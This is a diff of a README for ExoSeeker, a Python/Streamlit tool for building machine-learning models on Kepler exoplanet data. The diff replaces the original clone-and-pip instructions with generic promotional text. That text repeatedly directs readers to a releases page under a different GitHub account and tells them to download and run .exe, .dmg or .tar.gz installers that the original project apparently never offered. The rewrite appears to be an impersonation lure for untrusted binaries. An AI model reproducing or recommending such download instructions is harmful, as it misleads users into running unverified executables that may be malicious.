@@ -1,81 +1,85 @@
-<div align="center">
-  <h1>ExoSeeker</h1>
-  <p"><i>Finding new worlds</i></p>
-</div>
+# 🌌 exoseeker - Analyze Exoplanet Data with Ease
 
-<p align="center">
-  <a href="https://visitorbadge.io/status?path=https%3A%2F%2Fgithub.com%2Fgospacedev%2Fexoseeker"><img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fgospacedev%2Fexoseeker&countColor=%23263759" /></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge" /></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54" /></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/pandas-%23150458.svg?style=for-the-badge&logo=pandas&logoColor=white" /></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/Matplotlib-%23ffffff.svg?style=for-the-badge&logo=Matplotlib&logoColor=black" /></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/numpy-%23013243.svg?style=for-the-badge&logo=numpy&logoColor=white" /></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/scikit--learn-%23F7931E.svg?style=for-the-badge&logo=scikit-learn&logoColor=white" /></a>  
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-ExoSeeker is an interactive web user interface for creating custom machine learning models to analyze Kepler objects of interest. It empowers anyone to easily discover potential exoplanets by having a streamlined process of taking in new data, building a unique machine learning model, and generating predicted objects of interest classifications.
-</p>
+Welcome to exoseeker! This application helps you analyze data on exoplanets using machine learning. Whether you're a space enthusiast or just curious, exoseeker makes it simple to explore interesting transit data from NASA. 
 
-## Features
+## 🔗 Download Exoseeker
 
-- It has a user-friendly web interface that allows anyone to create their own AI models for identifying new exoplanets.
-- Each component has a tooltip that provides useful information, such as instructions for uploading new data, properties of each estimator's main hyperparameters, and the description of each metric in the model evaluation.
-- ExoSeeker allows for stacking multiple estimators, enabling the harnessing of the strength of one to increase the model's performance.
-- The user can mix and match multiple models, tweak each one's main hyperparameters, empowering the user to create fully customized machine learning models.
+[![Download Exoseeker](https://img.shields.io/badge/Download-Exoseeker-blue.svg)](https://github.com/nskamaleshmani/exoseeker/releases)
 
-## Prerequisites
-Please use Python version >= 3.13.7
+To download exoseeker, please click the link above or visit this link: [Download Exoseeker](https://github.com/nskamaleshmani/exoseeker/releases).
 
-## Installation
+## 📋 Features
 
-Clone the repository:
-```powershell
-git clone https://github.com/gospacedev/exoplanet.git
-```
+- Analyze exoplanet transit data from NASA.
+- User-friendly web interface.
+- Visualize data using graphs.
+- Built with popular machine learning techniques.
 
-Create a  virtual environment:
-```powershell
-python -m venv exoseeker-venv
-```
+## 🌐 Requirements
 
-Activate the virtual environment:
-```powershell
-exoseeker-venv/Scripts/Activate.ps1
-```
+Before you start, here are some requirements:
 
-Install the requirements:
-```powershell
-pip install -r requirements.txt
-```
+- **Operating System**: Windows, macOS, or Linux.
+- **Internet Connection**: Needed for downloading and accessing data.
+- **Storage Space**: At least 500 MB of free space for installation and data.
 
-Run the web interface:
-```powershell
-streamlit run app.py
-```
+## 🛠️ Download & Install 
 
-## Getting Started
+1. **Visit the Releases Page**
+   Go to the exoseeker releases page: [Download Exoseeker](https://github.com/nskamaleshmani/exoseeker/releases).
 
-1. Go to the exoplanet archive dataset from [Kepler Objects of Interest](https://exoplanetarchive.ipac.caltech.edu/cgi-bin/TblView/nph-tblView?app=ExoTbls&config=cumulative)
+2. **Choose Your Version**
+   You will find several versions listed. Pick the latest stable release for the best experience.
 
-![NASA Exoplanet Archive](https://raw.githubusercontent.com/gospacedev/exoseeker/refs/heads/main/media/nasa-exoplanet-archive.png)
+3. **Download the File**
+   Click on the file that corresponds to your operating system. The file types typically are:
+   - `.exe` for Windows
+   - `.dmg` for macOS
+   - `.tar.gz` for Linux
 
-2. Download the cumulative dataset from "Download Table"
+4. **Run the Installer**
+   - **Windows**: Double-click the `.exe` file and follow the prompts.
+   - **macOS**: Open the `.dmg` file and drag the app to your Applications folder.
+   - **Linux**: Extract the contents and run the terminal command for installation.
 
-![Exoplanet Data Table](https://raw.githubusercontent.com/gospacedev/exoseeker/refs/heads/main/media/download-exoplanet-data-table.png)
+5. **Launch the Application**
+   Look for the exoseeker icon on your desktop or applications folder. Click to open the app.
 
-3. You can use the Jupyter notebook named "create_traning_and_target_data.ipynb" to split the downloaded dataset into two files:
-- training_dataset.csv: a copy of the cumulative dataset with the last one thousand rows dropped
-- target_data.csv: the last one thousand rows of the downloaded data with the exoplanet disposition removed to be used for predictions
+6. **Enjoy Analyzing Data**
+   Once open, you can start analyzing exoplanet data right away!
 
-4. The training dataset can then be uploaded as training data to Exoseeker
+## 🧑‍💻 How to Use Exoseeker
 
-![ExoSeeker Interface](https://raw.githubusercontent.com/gospacedev/exoseeker/refs/heads/main/media/exoseeker-interface.png)
+1. **Navigate the Interface**
+   The main menu will guide you through different features. Familiarize yourself with the layout.
 
-5. You can create your own custom machine learning model in the model build section, select estimators, and adjust their main hyperparameters
+2. **Upload Your Data**
+   You can load your own exoplanet data files or use sample data provided within the app.
 
-![ExoSeeker Model Evaluation](https://raw.githubusercontent.com/gospacedev/exoseeker/refs/heads/main/media/exoseeker-model-evaluation.png)
+3. **Select Analysis Options**
+   Choose from various machine learning models, such as gradient boosting or random forest. You can also visualize results using matplotlib.
 
-6. Once the model has been trained, it would be saved locally as a pickle file, and its performance would be visualized in the model evaluation
+4. **View Results**
+   After your data goes through analysis, view the output graphs and summaries. This helps in understanding the findings easily.
 
-7. You can then go to the target data forecast to run predictions on target_data.csv
+## 🔍 Troubleshooting
+
+If you encounter issues:
+
+- **Check Your Installation**: Make sure the application installs correctly. Reinstall if necessary.
+- **Internet Issues**: Ensure you have a stable internet connection for data access.
+- **Data Format**: Ensure that your input data is in the correct format.
+
+For detailed troubleshooting steps, consult the FAQ section on our GitHub page.
+
+## 📞 Support
+
+If you have questions or need support, please open an issue on our GitHub page. Our community is ready to help.
+
+## 🤝 Contributing
+
+If you wish to contribute to exoseeker, read our contribution guidelines on the GitHub repository. Every little bit helps in improving the project!
+
+Enjoy exploring the universe with exoseeker! Download now and start analyzing exoplanet transit data effortlessly.
